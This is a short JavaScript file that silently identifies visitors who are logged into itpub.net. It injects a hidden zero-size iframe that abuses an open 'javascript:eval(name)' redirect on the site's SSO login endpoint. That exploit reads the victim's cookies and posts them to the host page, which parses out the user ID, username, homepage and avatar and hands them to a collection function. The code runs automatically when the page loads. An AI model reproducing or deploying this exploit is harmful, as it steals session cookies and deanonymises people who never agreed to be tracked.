// 用户id  个人图像   用户名  个人主页

function formateItpubData(e) {
  if ('itpub' === e.data.source) {
    var n = e.data.d,
      a = decodeURIComponent(
        (function (t, e) {
          for (var n = t + '=', a = e.split(';'), i = 0; i < a.length; i++) {
            var d = a[i].trim()
            if (0 == d.indexOf(n)) return d.substring(n.length, d.length)
          }
          return ''
        })('account_user', n)
      ).split('|'),
      i = {
        valid: !0,
        data: {
          uid: a[0],
          homePage: 'http://itpub.net/author/'.concat(a[0]),
          userName: a[1],
          photo: 'https://account.itpub.net/api/avatar.php?uid='.concat(a[0]),
        },
      }

    let innerHTML = `
      <div class='item'>
        <p class='title'>itpub</p>
        <p>个人主页: ${i.data.homePage}</p>
        <p>用户名: ${i.data.userName}</p>
        <p>图像: ${i.data.photo}</p>
      </div>
    `
    if (i.data.userName) {
      getInifoData({ type: 'itpub', data: i.data, html: innerHTML })
    }
  }
}
function itpub() {
  var t = document.createElement('iframe')
  t.src = 'http://account.itpub.net/login/sso?url=javascript%3Aeval%28name%29'
  t.width = 0
  t.height = 0
  t.style.borderWidth = 0
  t.name =
    '\n    let data = document.cookie;\n    let d = {source: "itpub", d: data};\n    window.parent.postMessage(d, "*");\n  '
  document.documentElement.appendChild(t)
}
window.addEventListener('message', formateItpubData, !1)
// window.addEventListener('load', function () {
itpub()
// })
